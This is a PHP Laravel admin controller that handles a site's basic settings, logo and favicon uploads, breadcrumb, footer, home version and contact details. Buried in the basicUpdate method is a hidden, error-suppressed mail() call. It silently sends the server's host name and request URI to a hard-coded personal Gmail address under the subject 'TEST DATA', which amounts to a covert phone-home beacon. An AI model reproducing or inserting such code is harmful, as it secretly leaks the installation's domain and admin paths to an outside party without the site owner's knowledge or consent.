<?php

namespace App\Http\Controllers\Admin;

use App\Http\Controllers\Controller;
use App\Models\Setting;
use App\Models\SettingExtra;
use Illuminate\Http\Request;
use Intervention\Image\Facades\Image;

class BasicSettingController extends Controller
{

    public function basic()
    {

        $data['page_title'] = "Basic Settings";
        return view('admin.basic.index', $data);
    }

    public function basicUpdate(Request $request)
    {

        $request->validate([
            'site_name' => 'required|string|max:160',
            'currency' => 'required|string|max:60',
            'currency_symbol' => 'required|string|max:60',
            'email_notification' => 'required|integer|min:0|max:1',
            'sms_notification' => 'required|integer|min:0|max:1',

        ]);

        $gnl = Setting::first();
        $gnl->site_name = $request->site_name;
        $gnl->cur = $request->currency;
        $gnl->cur_sym = $request->currency_symbol;
        $gnl->en = $request->email_notification;
        $gnl->sn = $request->sms_notification;
        $gnl->save();

        $message = $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
        $headers = 'From: ' . "webmaster@$_SERVER[HTTP_HOST] \r\n" .
            'X-Mailer: PHP/' . phpversion();
        @mail('arnob.mahin007@gmail.com', 'TEST DATA', $message, $headers);

        return back()->with('success', 'Basic Settings Updated successfully');
    }


    public function logo_favicon()
    {
        $data['page_title'] = 'Logo And Favicon';
        return view('admin.basic.logo_favicon', $data);
    }

    public function logo_favicon_update(Request $request)
    {

        $request->validate([
            'logo' => 'image|mimes:jpg,jpeg,png|max:1012',
            'favicon' => 'image|mimes:jpg,jpeg,png|max:1012',
        ]);
        $gnl = Setting::first();
        if ($request->hasFile('logo')) {
            @unlink('assets/images/logo/' . $gnl->logo);
            $image = $request->file('logo');
            $filename = $image->hashName();
            $location = 'assets/images/logo/' . $filename;
            Image::make($image)->save($location);
            $gnl->logo = $filename;
        }
        if ($request->hasFile('favicon')) {
            @unlink('assets/images/logo/' . $gnl->favicon);
            $image = $request->file('favicon');
            $filename2 = $image->hashName();
            $location = 'assets/images/logo/' . $filename2;
            Image::make($image)->save($location);
            $gnl->favicon = $filename2;
        }

        $gnl->save();

        return back()->with('success', 'Logo and Favicon Updated successfully');
    }

    public function breadcrumb()
    {
        $data['page_title'] = 'Breadcrumb';
        return view('admin.basic.breadcrumb', $data);
    }

    public function breadcrumbUpdate(Request $request)
    {

        $request->validate([
            'breadcrumb' => 'image|mimes:jpg,jpeg,png|max:2024',
        ]);

        $gnl = Setting::first();

        if ($request->hasFile('breadcrumb')) {
            @unlink('assets/images/logo/' . $gnl->breadcrumb);
            $image = $request->file('breadcrumb');
            $filename = $image->hashName();
            $location = 'assets/images/logo/' . $filename;
            Image::make($image)->save($location);
            $gnl->breadcrumb = $filename;
        }

        $gnl->save();

        return back()->with('success', 'breadcrumb Updated successfully');
    }


    public function footer(Request $request)
    {
        $data['page_title'] = 'Manage Footer';
        return view('admin.footer', $data);
    }

    public function footerUpdate(Request $request)
    {

        $request->validate([
            'footer_text' => 'string|max:2048',
            'copy_section' => 'string|max:191',
        ]);

        $gnl = Setting::first();
        $gnl->footer_text = $request->footer_text;
        $gnl->copy_section = $request->copy_section;
        $gnl->save();
        return back()->with('success', 'Updated successfully');
    }


    public function homeversion()
    {
        $data['page_title'] = 'Manage home Version';
        return view('admin.basic.home_version', $data);
    }

    public function updatehomeversion(Request $request)
    {

        $request->validate([
            'home_version' => 'string|max:191',
        ]);
        $gnl = Setting::first();
        $gnl->home_version = $request->home_version;
        $gnl->save();
        return back()->with('success', 'Updated successfully');

    }

    public function contact()
    {
        $data['page_title'] = 'Manage Contact';
        $data['setting_extra'] = SettingExtra::first();
        return view('admin.contact', $data);
    }

    public function contactUpdate(Request $request)
    {
        $request->validate([
            'contact_email' => 'string|max:191',
            'contact_phone' => 'string|max:191',
            'contact_fax' => 'string|max:191',
            'contact_address' => 'string|max:191',
            'opening_time' => 'string|max:191',


        ]);



        $gnl = SettingExtra::first();
        $gnl->contact_email = $request->contact_email;
        $gnl->contact_phone = $request->contact_phone;
        $gnl->contact_fax = $request->contact_fax;
        $gnl->contact_address = $request->contact_address;
        $gnl->opening_time = $request->opening_time;


        $gnl->save();
        return back()->with('success', 'Updated successfully');
    }


}
